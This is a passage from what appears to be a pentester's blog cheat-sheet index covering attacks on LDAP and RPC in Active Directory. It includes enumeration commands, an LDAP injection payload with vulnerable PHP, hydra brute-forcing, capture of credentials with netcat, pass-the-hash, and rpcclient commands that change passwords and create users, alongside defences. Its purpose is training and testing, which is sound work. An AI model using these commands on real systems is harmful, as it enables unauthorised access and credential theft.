(\u0026amp;(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))) # Example Using LDAPSearch ldapsearch -x -b \u0026#34;dc=sugarape,dc=local\u0026#34; -H ldap://10.129.95.210 \u0026#34;(\u0026amp;(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))\u0026#34; ldapsearch -h 172.16.5.5 -x -b \u0026#34;DC=SUGARAPE,DC=LOCAL\u0026#34; -s sub \u0026#34;(\u0026amp;(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))\u0026#34; | grep \u0026#34;sugarape.local\u0026#34; +Note+: Can pipe into grep as well once an email is discovered to pipe out valid usernames:\nWindows:\n#LDAP Query (\u0026amp;(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))) # Example Using LDAPFilter Get-ADObject -LDAPFilter \u0026#34;(\u0026amp;(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))\u0026#34; Account Expires in Specific Time Frame: Linux: #LDAP Query (\u0026amp;(objectClass=user)(accountExpires\u0026gt;=131342487000000000)(accountExpires\u0026lt;=131395327000000000)) # Example Using LDAPSearch ldapsearch -x -b \u0026#34;dc=sugarape,dc=local\u0026#34; -H ldap://10.129.95.210 \u0026#34;(\u0026amp;(objectClass=user)(accountExpires\u0026gt;=131342487000000000)(accountExpires\u0026lt;=131395327000000000))\u0026#34; Windows: #LDAP Query (\u0026amp;(objectClass=user)(accountExpires\u0026gt;=131342487000000000)(accountExpires\u0026lt;=131395327000000000)) # Example Using LDAPFilter Get-ADObject -LDAPFilter \u0026#34;(\u0026amp;(objectClass=user)(accountExpires\u0026gt;=131342487000000000)(accountExpires\u0026lt;=131395327000000000))\u0026#34; List Disabled Accounts: Linux: #LDAP Query (\u0026amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)) # Example Using LDAPSearch ldapsearch -x -b \u0026#34;dc=sugarape,dc=local\u0026#34; -H ldap://10.129.95.210 \u0026#34;(\u0026amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))\u0026#34; Windows: #LDAP Query (\u0026amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)) # Example Using LDAPFilter Get-ADObject -LDAPFilter \u0026#34;(\u0026amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))\u0026#34; Linux System Support: Linux: #LDAP Query (\u0026amp;(objectClass=device)(osName=Linux*)) # Example Using LDAPSearch ldapsearch -x -b \u0026#34;dc=sugarape,dc=local\u0026#34; -H ldap://10.129.95.210 \u0026#34;(\u0026amp;(objectClass=device)(osName=Linux*))\u0026#34; Windows: #LDAP Query (\u0026amp;(objectClass=device)(osName=Linux*)) # Example Using LDAPFilter Get-ADObject -LDAPFilter \u0026#34;(\u0026amp;(objectClass=device)(osName=Linux*))\u0026#34; SearchBase and SearchScope Parameters: The SearchBase parameter: This parameter specifies an Active Directory path to search under and allows us to begin searching for a user account in a specific OU: It accepts an OU\u0026rsquo;s AD Distinguished Name (DN) \u0026ldquo;OU=Employees,DC=CONTOSO,DC=LOCAL\u0026rdquo;. The SearchScope parameter: \u0026ldquo;SearchScope\u0026rdquo; allows us to define how deep into the OU hierarchy we would like to search.\nThere are three levels of depth we can search when using this parameter:\nSearchScope Depth:\nDepth: 0\nName: Base Description: The object is specified as the SearchBase. For example, if we ask for all users in an OU defining a base scope, we get no results. If we specify a user or use Get-ADObject we get just that user or object returned. Depth: 1\nName: OneLevel Description: Searches for objects in the container defined by the SearchBase but not in any sub-containers. Depth: 2\nName: SubTree Description: Searches for objects contained by the SearchBase and all child containers, including their children, recursively all the way down the AD hierarchy. +Example Picture and searches+:\nIn the above example with the SearchBase set to the AD Operational Unit (OU) OU=Employees,DC=SUGARAPE,DC=LOCAL we can set the scope to the following. We are going to be querying for user, by passing these parameters to Get-AdUser: Base/0 Would attempt to query the OU object (Employees) itself. Result: We would get 0 hits as there are no users directly in the base. OneLevel/1 Would search within the Employees OU only. Result: We would get the user Amelia Matthews returned as she is sitting nested within it and the first/oneLevel SubTree/2 Queries the Employees OU and all of the sub-OUs underneath it, such as Accounting, Contractors, etc. OUs under those OUs (child containers). Results: We would get all users nested within the sub-ou\u0026rsquo;s, in this instance 970 users Passing SearchScope Depth as an argument:\nWe can use name or number \u0026amp; they are both interpreted the same: +Example+: SearchScope OneLevel +Example+: SearchScope 1 Both of these are valid and will work. Example Queries: Get-ADUser -SearchBase \u0026#34;OU=Employees,DC=CONTOSO,DC=LOCAL\u0026#34; -SearchScope OneLevel -Filter * Get-ADUser -SearchBase \u0026#34;OU=IT,DC=CONTOSO,DC=LOCAL\u0026#34; -SearchScope 1 -Filter * Get-ADUser -SearchBase \u0026#34;OU=Domain Admins,DC=CONTOSO,DC=LOCAL\u0026#34; -SearchScope 2 -Filter * (Get-ADUser -SearchBase \u0026#34;OU=IT,DC=CONTOSO,DC=LOCAL\u0026#34; -SearchScope 2 -Filter *).count +Enumerating LDAP+ +If we see LDAP on a server running and there is an application it may be being used for AUTH.+ See LDAP Injection: LDAPire: Custom LDAP Enumeration Tool LDAPire is my own custom-built Python-based tool for Active Directory reconnaissance and enumeration. It\u0026rsquo;s designed to streamline the process of gathering essential AD information during penetration tests or security assessments.\nKey features:\nAdaptive connection attempts (SSL and non-SSL) Flexible authentication (anonymous and authenticated) Comprehensive user and group enumeration Multiple output files for quick reference and detailed analysis Robust error handling and logging Usage:\npython3 pythonldap.py \u0026lt;DC_IP\u0026gt; [-u USERNAME] [-p PASSWORD] #Example python3 pythonldap.py 192.168.1.100 -u \u0026#34;DOMAIN\\username\u0026#34; python3 pythonldap.py 192.168.1.100 \u0026#34;FQDN/IP\u0026#34; Output files:\nusersLdap.txt: List of user sAMAccountNames usersLdap_detailed.txt: Detailed user information groupsLdap.txt: List of group sAMAccountNames groupsLdap_detailed.txt: Detailed group information For more information and to access the tool, visit the LDAPire GitHub repository .\nhttps://bloodstiller.com/tools/ldapire/ Establishing Naming context with NMAP: Run Scan: Command: nmap --script ldap* -sV -A -Pn [IP] -p389,636 -oA IP-LDAP Location of scripts: ls usr/share/nmap/scripts | grep -i ldap locate *nse | grep ldap +Example+ of how I got the necessary information for the box monteverde below and I was able to enumerate using LDAP: In the below output we can see from the first lines the domain and the ldap server. rootDomainNamingContext: DC=MEGABANK,DC=LOCAL DC name is MEGABANK.LOCAL ldapServiceName: MEGABANK.LOCAL:monteverde$@MEGABANK.LOCAL Ldap server name is monteverde.MEGABANK.LOCAL Writeup here: https://bloodstiller.com/walkthroughs/monteverde-box/ \u0026lt;SNIP\u0026gt; PORT STATE SERVICE VERSION 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name) | ldap-rootdse: | LDAP Results | \u0026lt;ROOT\u0026gt; | domainFunctionality: 7 | forestFunctionality: 7 | domainControllerFunctionality: 7 | rootDomainNamingContext: DC=MEGABANK,DC=LOCAL | ldapServiceName: MEGABANK.LOCAL:monteverde$@MEGABANK.LOCAL \u0026lt;SNIP\u0026gt; Enumerating LDAP using ldapsearch: Enumerate LDAP naming context server name and domain name: +DO THIS FIRST!+ before anything else.\nWe cannot do ldap queries without knowing the FQDN of the ldap server and the domain name e.g \u0026quot;dc=sugarape,dc=local\u0026quot;. Establish Naming Context:\nldapsearch -H ldap://[IP] -x -s base namingcontexts ldapsearch -H ldap://10.129.228.111 -x -s base namingcontexts Check for anonymous bind using ldapsearch: ldapsearch -H ldap://[IP] -x -b \u0026#34;dc=[DOMAIN],dc=[DOMAIN]\u0026#34; ldapsearch -H ldap://10.129.1.207 -x -b \u0026#34;dc=sugarape,dc=local\u0026#34; Enumerate entire domain with ldapsearch: ldapsearch -H ldap://[LDAPName] -x -b \u0026#34;DC=[DCName],DC=[DCNAME]\u0026#34; \u0026gt;\u0026gt; ldapDump.txt ldapsearch -H ldap://monteverde.MEGABANK.LOCAL -x -b \u0026#34;DC=MEGABANK,DC=LOCAL\u0026#34; \u0026gt;\u0026gt; ldapDump.txt Enumerating LDAP using windapsearch: There are two different versions of windapsearch, in my testing it\u0026rsquo;s actually better to use the GO version as it seems to work, there are some issues with the current python version with imports being outdated etc. The syntax is different for the GO version in we have to specify the module with -m then the module name e.g. users We can enumerate via ldap with just a password too, alas the Support box: +Example+: ldapsearch -H ldap://$box -D ldap@[domain].[domain] -w '[Password]' -b \u0026quot;dc=[domain],dc=[domain]\u0026quot; \u0026quot;*\u0026quot;} https://bloodstiller.com/walkthroughs/support-box/ Check for anonymous bind using windapsearch: python3 windapsearch.py --dc-ip [IP] -u \u0026#34;\u0026#34; --functionality python3 windapsearch.py --dc-ip 10.129.1.207 -u \u0026#34;\u0026#34; --functionality Enumerate all users using windapsearch: python3 windapsearch.py --dc-ip [DC-IP] -u \u0026#34;\u0026#34; -U python3 windapsearch.py --dc-ip 10.129.1.207 -u \u0026#34;\u0026#34; -U Enumerate all computers using windapsearch: python3 windapsearch.py --dc-ip [DC-IP] -u \u0026#34;\u0026#34; -C python3 windapsearch.py --dc-ip 10.129.1.207 -u \u0026#34;\u0026#34; -C Enumerate all groups using windapsearch: python3 windapsearch.py --dc-ip [DC-IP] -u \u0026#34;\u0026#34; -G python3 windapsearch.py --dc-ip 10.129.1.207 -u \u0026#34;\u0026#34; -G Scripts for Querying LDAP: From within a python console: from ldap3 import * s = Server(\u0026#39;[IP]\u0026#39;,get_info = ALL) c = Connection(s, \u0026#39;\u0026#39;, \u0026#39;\u0026#39;) c.bind() ## If it returns true we can run the next command it will return all LDAP information s.info Simple Python Script: from ldap3 import * srver = input(\u0026#34;Enter IP of DC \u0026#34;) s = Server(srver,get_info = ALL) c = Connection(s, \u0026#39;\u0026#39;, \u0026#39;\u0026#39;) checkserver = c.bind() if checkserver == True: print(s.info) else: \u0026#34;Server does not allow LDAP Anonymous bind\u0026#34; More advanced python script that allows passing username and passwords, also implements SSL: from ldap3 import * import re import argparse import logging import getpass def is_valid_ip(ip): pattern = re.compile(r\u0026#34;^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$\u0026#34;) return pattern.match(ip) is not None # Setup logging logging.basicConfig(filename=\u0026#39;ldap_test.log\u0026#39;, level=logging.INFO) # Command-line argument parsing parser = argparse.ArgumentParser(description=\u0026#34;LDAP Anonymous Bind Test\u0026#34;) parser.add_argument(\u0026#39;dc_ip\u0026#39;, help=\u0026#34;IP address of the Domain Controller\u0026#34;) parser.add_argument(\u0026#39;-u\u0026#39;, \u0026#39;--user\u0026#39;, help=\u0026#34;Username for authentication\u0026#34;, default=\u0026#39;\u0026#39;) parser.add_argument(\u0026#39;-p\u0026#39;, \u0026#39;--password\u0026#39;, help=\u0026#34;Password for authentication\u0026#34;, default=\u0026#39;\u0026#39;) args = parser.parse_args() # Validate IP address srver = args.dc_ip if not is_valid_ip(srver): print(\u0026#34;Invalid IP address format.\u0026#34;) logging.error(f\u0026#34;Invalid IP address format: {srver}\u0026#34;) exit(1) # Handle secure password input user = args.user password = args.password if not password and user: password = getpass.getpass(\u0026#34;Enter password: \u0026#34;) # Function to attempt LDAP connection def attempt_connection(use_ssl): try: s = Server(srver, use_ssl=use_ssl, get_info=ALL) c = Connection(s, user, password) checkserver = c.bind() return s, c, checkserver except Exception as e: logging.error(f\u0026#34;Error connecting to the server with SSL={use_ssl}: {e}\u0026#34;) return None, None, False # Attempt to connect with SSL first print(f\u0026#34;Attempting to connect to {srver} with SSL...\u0026#34;) logging.info(f\u0026#34;Attempting to connect to {srver} with SSL\u0026#34;) s, c, checkserver = attempt_connection(use_ssl=True) # If SSL connection fails, retry without SSL if not checkserver: print(\u0026#34;Failed to connect with SSL. Retrying without SSL...\u0026#34;) logging.warning(\u0026#34;Failed to connect with SSL. Retrying without SSL...\u0026#34;) s, c, checkserver = attempt_connection(use_ssl=False) # Final status check if checkserver: print(\u0026#34;Connected successfully. Retrieving server information...\u0026#34;) logging.info(\u0026#34;Connected successfully\u0026#34;) print(s.info) else: print(\u0026#34;Failed to connect: Server does not allow LDAP Anonymous bind or invalid credentials.\u0026#34;) logging.error(\u0026#34;Failed to connect: Server does not allow LDAP Anonymous bind or invalid credentials.\u0026#34;) Powershell Script to query LDAP: # Create a DirectoryEntry object for the LDAP path $ldapPath = \u0026#34;LDAP://dc=sugarape,dc=local\u0026#34; $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath) # Create a DirectorySearcher object $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry) # Define the LDAP filter $searcher.Filter = \u0026#34;(\u0026amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))\u0026#34; # Search in the entire subtree $searcher.SearchScope = \u0026#34;Subtree\u0026#34; # Find all matching entries $results = $searcher.FindAll() # Iterate through the results and display the properties foreach ($result in $results) { $entry = $result.GetDirectoryEntry() $entry.Properties | foreach { Write-Output \u0026#34;$($_.PropertyName) = $($_.Value)\u0026#34; } } +Attacking LDAP+ Netexec/Crackmapexec: Has alot of amazing modules we can use with LDAP: Command: crackmapexec ldap -L LDAP Credential Stealing: In the box, Authority it is possible to steal LDAP credentials by hosting a malicious ldap server and then forcing a client that uses LDAP to authenticate back to us our endpoint.\nIf you can control force authentication to an endpoint of your choosing this is viable way to steal crededentials\nHave the victim connect back to us:\nWith PWM if we can access the config page we can enter our URL: Ensure ldap not ldaps or it will be encrypted and you will just see cipher text. Setup Listening Server:\nnc -nvlp 636 +Note+: No special type of server needs to be used just a server and port to listen on. Initiate Connection:\nCapture Creds:\nVerify with netexec or tool of your choosing:\nnetexec ldap $domain -u $user -p $pass Password Spraying \u0026amp; Bruteforcing LDAP: LDAP bruteforcing with hydra: Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f LDAP Injection: LDAP injection attacks are similar to SQL Injection attacks but target the LDAP directory service instead of a database.\nhttps://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html https://book.hacktricks.xyz/pentesting-web/ldap-injection \u0026lt;/ox-hugo/EN-Blackhat-Europe-2008-LDAP-Injection-Blind-LDAP-Injection.pdf\u0026gt;\nWe can fuzz using burp:\nCapture request and then use these lists to fuzz injection points: https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_attributes.txt Attack Explained. To test for LDAP injection, we can use input values that contain special characters or operators that can change the query\u0026rsquo;s meaning: Injection Characters: * An asterisk * can match any number of characters. ( ) Parentheses ( ) can group expressions. | A vertical bar | can perform logical OR. \u0026amp; An ampersand \u0026amp; can perform logical AND. (cn=*) Input values that try to bypass authentication or authorisation checks by injecting conditions that always evaluate to true can be used. For example, (cn=*) or (objectClass=*) can be used as input values for a username or password fields. Example of Vulnerable Code $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $filter = \u0026#34;(\u0026amp;(uid=$username)(userPassword=$password))\u0026#34;; $result = ldap_search($ldapconn, $basedn, $filter); Example of Injection Attack\n:ID: 4826ee7c-d9a3-4bec-afc1-129c87b6f360\nAn attacker could input *)(uid=*))(|(uid=* as the username, which would modify the LDAP filter to:\n(\u0026amp;(uid=*)(uid=*))(|(uid=*)(userPassword=password)) This could potentially bypass authentication.\nReal-world Example For example, suppose an application uses the following LDAP query to authenticate users: (\u0026amp;(objectClass=user)(sAMAccountName=$username)(userPassword=$password)) This is an actual piece of PHP code that would run. In this query, $username and $password contain the user\u0026rsquo;s login credentials. An attacker could inject the * character into either field to modify the LDAP query and bypass authentication as it\u0026rsquo;s not being sanitized. If injected into the $username field the LDAP query will match any user account with any password!! If injected into the $password field the LDAP query match any user account with any password that contains the injected string. This would allow the attacker to gain access to the application with any username +Lab Example+: I injected the * char into the username and password fields and could login as the code was not being sanitized. Prevention Techniques Input Validation: Sanitize and validate all user inputs before using them in LDAP queries. Use Bind Operations: Instead of constructing search filters with user input, use LDAP bind operations for authentication. Escape Special Characters: Use LDAP-specific escaping functions to neutralize special characters in user input. Implement Least Privilege: Ensure LDAP accounts have minimal necessary permissions. Use Prepared Statements: If available in your programming language, use LDAP prepared statements to separate queries from data. Fix To mitigate the risks associated with LDAP injection attacks, it is crucial to thoroughly validate and sanitize user input before incorporating it into LDAP queries. This process should involve removing LDAP-specific special characters like * and employing parameterised queries to ensure user input is treated solely as data, not executable code. Additional Resources OWASP LDAP Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html LDAP Injection \u0026amp; Blind LDAP Injection in Web Applications: https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf Troubleshooting LDAP Common LDAP issues and their solutions:\nConnection Failures\nCheck network connectivity Verify LDAP server is running Ensure correct LDAP URL (ldap:// or ldaps://) Check firewall settings Authentication Issues\nVerify correct bind DN and password Check user account status (not locked or disabled) Ensure user has necessary permissions Search Problems\nVerify correct base DN Check search filter syntax Ensure attributes being searched exist in schema SSL/TLS Issues\nVerify SSL certificates are valid and trusted Check SSL/TLS configuration on both client and server Performance Problems\nOptimize search filters Use indexing on frequently searched attributes Consider implementing connection pooling Schema Violations\nEnsure all required attributes are provided Check attribute syntax and value constraints Replication Issues\nCheck network connectivity between replicas Verify replication agreements are correctly configured Check for conflicting updates Tools for LDAP Troubleshooting:\nldapsearch: Command-line tool for performing LDAP searches Wireshark: Network protocol analyzer for inspecting LDAP traffic Directory Server Log Analysis tools LDAP Security Best Practices Use LDAPS (LDAP over SSL/TLS) to encrypt communications\nImplement strong authentication methods (e.g., SASL)\nApply the principle of least privilege for LDAP accounts\nRegularly audit and update LDAP configurations\nUse input validation and parameterized queries to prevent LDAP injection\nImplement proper password policies\nMonitor LDAP logs for suspicious activities\nKeep LDAP software and related components up to date\nUse firewalls to restrict LDAP access to authorized hosts only\nImplement account lockout policies to prevent brute-force attacks\nFix:\nTo mitigate the risks associated with LDAP injection attacks, it is crucial to thoroughly validate and sanitize user input before incorporating it into LDAP queries. This process should involve removing LDAP-specific special characters like * and employing parameterised queries to ensure user input is treated solely as data, not executable code. LDAP Boxes on HTB: Easy:\nForest E Return E Support E Active E Medium:\nMonteverde M YPuffy M Lightweight M Cascade M StreamIO M Intelligence M Outdated M Scrambled M Fuse M Resolute M Hard:\nBlackfield H Travel H Pikaboo H Insane:\nPivotAPI I Sekhmet I Rebound I Fulcrum I Absolute I Coder I Response I Sizzle I CTF I Multimaster I Endgames:\nOdyssey Prolabs:\nRastaLabs I Cybernetics A Dante I APTLabs A Zephyr I ", 
        "url": "http:\/\/localhost:1313\/cheatsheets\/ldap-cheatsheet\/"
    },
    
    "http:\/\/localhost:1313\/cheatsheets\/rpc-cheatsheet\/": {
        "title": "Attacking RPC: Deep Dive \u0026 Cheat Sheet",
        "tags": ["Pentesting","RPC","CheatSheet",],
        "content": "Introduction RPC (Remote Procedure Call) is a protocol that allows a program to execute a procedure or function on another computer as if it were a local call. This cheat sheet provides a comprehensive overview of RPC, including its functionality, security implications, and relevance to penetration testing.\nPort Number(s): RPC (Remote Procedure Call) does not operate on a specific port itself.\nInstead, it relies on underlying protocols to establish connections and transfer data. RPC uses different ports to facilitate communication between systems and services. Here\u0026rsquo;s a summary of the key ports involved: Port 135 (TCP/UDP):\nPurpose: Endpoint Mapper (EPM) for Microsoft RPC. Description: Acts as a directory service to map service requests to the appropriate dynamically assigned ports. Dynamic Ports (TCP/UDP):\nPurpose: RPC services can use dynamically assigned ports. Description: After an initial connection via port 135, RPC services typically assign dynamic ports in the range of 49152–65535. +Note+: The dynamic port range may differ depending on the OS and configuration. Port 593 (TCP):\nPurpose: HTTP RPC (RPC over HTTP). Description: Allows RPC communication over HTTP for remote management tasks. Usage: Can be used to bypass firewalls that block traditional RPC ports. Benefits: Useful for remote management in environments where direct RPC access is restricted. Enumeration: Can be enumerated using tools like Nmap with appropriate scripts. Port 80 (TCP) and Port 443 (TCP):\nPurpose: Standard HTTP and HTTPS ports, which can be used for RPC over HTTP(S). Description: When configured, allows RPC traffic to be tunneled through standard web protocols. Usage: Commonly used in scenarios where traditional RPC ports are blocked by firewalls. RPC over HTTP: RPC over HTTP (Port 593) can be used to bypass firewalls that block traditional RPC ports. Useful for remote management in environments where direct RPC access is restricted. Can be enumerated using tools like Nmap with appropriate scripts. RPC Connection Process (Deep Dive): Connection: Client initiates a request to the server:\nClient prepares the procedure name and parameters. Client stub is invoked, which acts as a proxy for the remote procedure. Parameters are marshalled (serialized) for transmission:\nData is converted into a standardized format (e.g., XDR, Protocol Buffers). Complex data structures are flattened into a byte stream. Request is sent over the network:\nThe marshalled data is packaged with metadata (e.g., procedure ID, version). Transmission occurs using the underlying network protocol (e.g., TCP/IP). Execution: Server receives and unmarshalls the request:\nServer stub receives the incoming request. Data is deserialized back into a format the server can process. Server executes the requested procedure:\nThe appropriate local procedure is identified and called. Server performs the requested operation with the provided parameters. Response Results are marshalled and sent back to the client:\nOutput data is serialized for network transmission. Response is packaged with any necessary metadata. Client unmarshalls and processes the results:\nClient stub receives and deserializes the response. Data is presented to the client application in the expected format. +Enumerating RPC+ You can see some of these enumeration steps performed on my walkthrough\u0026rsquo;s for Cascade \u0026amp; Fuse: https://bloodstiller.com/walkthroughs/cascade-box https://bloodstiller.com/walkthroughs/fuse-box Enumerating RPC using RPCclient: Remember we can pass the pash with rpcclient too:\n--pw-nt-hash \u0026lt;hash\u0026gt; +Note+: Sometimes not all command are available due to restrictions\nConnecting with rpcclient using a null/anonymous session: rpcclient -U \u0026#34;\u0026#34; [ip] rpcclient -U \u0026#39;%\u0026#39; [ip] Try both of these one may work and the other may not Enumerating users using rpcclient: # Enumerates domain users: enumdomusers +Note+: We will be given the users RID which can then be used with queryuser to enumerate further. This provides similar information to LDAP including Description etc #Query the user RID we have just found above: queryuser [RID] #Example queryuser 0x3e8 +Note+: Used with the RID discovered with enumdomusers above to enumerate users. We can then get the +RID of the group+ to then user the querygroup command. Enumerating Domain \u0026amp; Local Groups with rpcclient: Enumerating Domain alias groups: #Domain alias Groups: enumalsgroups domain #Local Groups: enumalsgroups builtin Alias Groups Explanation:\nAlias Groups (Local Groups): These groups are local to the machine or server, or specific to the domain controller but aren\u0026rsquo;t part of the global domain groups. Alias groups often correspond to built-in groups on Windows (e.g., Administrators, Backup Operators), but they can also be domain-specific local groups. Alias groups can only contain members from the local domain. Scope: - enumalsgroups domain/builtin: Lists local alias groups that are specific to the domain controller or server.\nEnumerating Domain Wide Groups: #Domain Wide Groups: enumdomgroups #Query the group of the user above: querygroup [GroupRID] #Example querygroup 0x201 Scope: enumdomgroups: Lists domain-wide groups that are used across the Active Directory domain. Further Enumeration Using rpcclient: # Enumerating the whole domain: enumdomains # Enumerate System privileges: enumprivs # Retrieve Information about Available Services using rpcclient: querydispinfo # Enumerate Domain Groups using rpcclient: enumdomgroups # Resolve SIDs to Names using rpcclient: lookupsids [SID] # Enumerate System Privileges using rpcclient: enumprivs # Enumerate Shared Resources using rpcclient: netshareenum # List Detailed Information about Shared Resources using rpcclient: netshareenumall # Retrieve Information about a Specific Share using rpcclient: netsharegetinfo [sharename] # Create a New Share using rpcclient: netshareadd \u0026#34;C:\\path\u0026#34; \u0026#34;sharename\u0026#34; [type] \u0026#34;Description\u0026#34; # Enumerate Trusted Domains using rpcclient: enumtrustdoms # Enumerate Printers enumprinters I used enumprinters in the HTB box Fuse to reveal a cleartext credential: https://bloodstiller.com/walkthroughs/fuse-box/ Enumerate Password Policy using rpcclient: Command: enumdompwinfo +Example output+: rpcclient $\u0026gt; getdompwinfo min_password_length: 5 password_properties: 0x00000000 Understanding password_properties:\npassword_properties is a bitmask, where different bits control specific password policies.\nHere are the common flags and what each bit represents:\nHex Value: 0x00000001\nFlag: DOMAIN_PASSWORD_COMPLEX\nMeaning: Enforces password complexity (requires uppercase, lowercase, digits, symbols)\nHex Value: 0x00000002\nFlag: DOMAIN_PASSWORD_NO_ANON_CHANGE\nMeaning: Prevents anonymous users from changing passwords\nHex Value: 0x00000004\nFlag: DOMAIN_PASSWORD_NO_CLEAR_CHANGE\nMeaning: Prevents passwords from being sent in cleartext\nHex Value: 0x00000008\nFlag: DOMAIN_LOCKOUT_ADMINS\nMeaning: Locks out administrators as well when lockout occurs\nHex Value: 0x00000010\nFlag: DOMAIN_PASSWORD_STORE_CLEARTEXT\nMeaning: Allows storing passwords using reversible encryption (cleartext)\nHex Value: 0x00000020\nFlag: DOMAIN_REFUSE_PASSWORD_CHANGE\nMeaning: Prevents users from changing their password\nHex Value: 0x00000000\nMeaning: Means that none of these password restrictions are enabled.\n# Enumerate Specific User Password Policy using rpcclient: getusrdompwinfo [UserRID] getusrdompwinfo 0x46f Searching for custom RID\u0026rsquo;s using rpcclient: Bruteforce Custom User RID's with forloop: Command: for i in $(seq 500 1100); do rpcclient -N -U \u0026quot;\u0026quot; [box] -c \u0026ldquo;queryuser 0x$(printf \u0026lsquo;%x\\n\u0026rsquo; $i)\u0026rdquo; | grep \u0026ldquo;User Name|user_rid|group_rid\u0026rdquo; \u0026amp;\u0026amp; echo \u0026quot;\u0026quot; done ```\n+Note+: This is used for searching for custom RIDs (see below) The values 500 \u0026amp; 1100 can be modified. Explanation of the Command: Loop (for i in $(seq 500 1100)):\nThe loop iterates over a range of values (500 to 1100), converting each value to a hexadecimal format (via printf '%x\\n' $i) because RIDs are expressed in hexadecimal. rpcclient -N -U \u0026quot;\u0026quot; \u0026lt;ip\u0026gt;:\n-N: Specifies no password, used for anonymous connections. -U \u0026quot;\u0026quot;: Attempts the connection without a username. [ip]: The IP address of the target server. queryuser 0x\u0026lt;rid\u0026gt;:\nQueries user information based on the given RID (Relative Identifier) from the current iteration of the loop, formatted as a hexadecimal value (e.g., 0x1f4 for RID 500). grep \u0026quot;User Name\\|user_rid\\|group_rid\u0026quot;:\nFilters the output to display only lines containing user name, user RID, or group RID for easier readability. Why RID Stop Around 500: Default RIDs in Windows:\nThe first 500 RIDs are typically reserved for well-known or default accounts and groups in Windows systems. For example:\n0x1f4 (500 in decimal) is often assigned to the Administrator account. 0x1f5 (501) is the Guest account. Other default users and built-in groups (e.g., Administrators group, Users group) are typically assigned RIDs in this range. Custom RIDs:\nRIDs above 500 are typically assigned to custom-created users and groups. When administrators create new users or groups, the system automatically assigns them higher RIDs, which is why your search starts at 500 and extends up to 1100 in this case. This range is where you would expect to find custom user accounts or groups. Purpose of the Command:\nSearch for Custom User RIDs: Since the well-known accounts usually stop around 500, we are searching through RIDs in the 500 to 1100 range, which is where custom-created users or groups are likely to have RIDs. This method can be useful in penetration testing or during enumeration to discover non-default user accounts that have been created on the system, particularly when we don’t have a complete list of users. Enumerating RPC using rpcinfo: rpcinfo [ip/url] rpcinfo 10.129.203.101 Enumerating RPC using Nmap: nmap -p 135 --script=msrpc-enum [target] nmap -p 135 --script=rpc-grind [target] +Note+: These Nmap scripts can provide valuable information about RPC services and endpoints. Enumerating RPC using impacket-rpcdump: impacket-rpcdump [domain/]username[:password]@target impacket-rpcdump ./Administrator:password123@192.168.1.100 +Note+: This tool can enumerate RPC endpoints and provide detailed information about available interfaces. +Attacking RPC+ Attacking RPC using rpcclient: Remember we can pass the pash with rpcclient too: --pw-nt-hash \u0026lt;hash\u0026gt; Change a users password using rpcclient: chgpasswd3 [user] [oldPass] [newPass] chgpasswd3 n.barley wellbum wellbum14 Create a new user using rpcclient: Create a new user on the remote Windows system using rpcclient with the createdomuser username command: createdomuser [username] setuserinfo2 username 24 [NewPassword] +Note+: In this example, the 24 value represents necessary Windows information class constant to set a user password. The value will always be 24 when setting a password. Create a new share using rpcclient: netshareadd \u0026#34;C:\\[FolderToShare]\u0026#34; \u0026#34;[NameOfShare]\u0026#34; [ShareType] \u0026#34;[ShareDescription]\u0026#34; netshareadd \u0026#34;C:\\Windows\u0026#34; \u0026#34;Windows\u0026#34; 10 \u0026#34;Windows Share\u0026#34; +Note+: 10: This is the share type. The value 10 indicates that it is a disk drive. Other values can represent different types of shares (e.g., printers). Remove a Shared Resource using rpcclient: netshareremove [sharename] Defending RPC Implement strong authentication and authorization Use encryption for data in transit (e.g., TLS) Regularly update and patch RPC services Implement proper input validation and sanitization Use firewalls and network segmentation to control RPC traffic Monitor and log RPC activities for suspicious behavior Common RPC Vulnerabilities: Buffer Overflows: Especially in older systems or poorly implemented RPC services. Null Session Attacks: When anonymous access is allowed. RPC Amplification Attacks: Used in DDoS scenarios. Improper Access Controls: Leading to unauthorized access to RPC functions. RPC Protocol Information: RPC Filtering: Windows systems often implement RPC filtering to restrict access. Can be configured through Group Policy or Windows Firewall with Advanced Security. Definition: A protocol for executing code on a remote server. Components: Client: Sends the request. Server: Executes the function and returns a result. Types: Synchronous RPC: Client waits for the server to respond. Asynchronous RPC: Client continues operation without waiting. Protocols: XML-RPC JSON-RPC gRPC Common Uses: Distributed computing Web services APIs Advantages: Simplifies development of distributed applications Allows for heterogeneous environments (different languages/platforms) Can improve performance in certain scenarios Disadvantages: Can introduce network-related complexities Potential security risks if not properly implemented May have higher latency compared to local procedure calls Implementation Considerations: Error handling for network issues Version compatibility between client and server Security measures (authentication, encryption) Performance optimization (caching, connection pooling) Security Concerns: Unauthorized access Data interception Denial-of-service attacks Relevance to Penetration Testing: Can be used to enumerate Active Directory environments. Enumeration of exposed functions Injection vulnerabilities Insecure data transmission Common RPC Frameworks: gRPC (Google) Apache 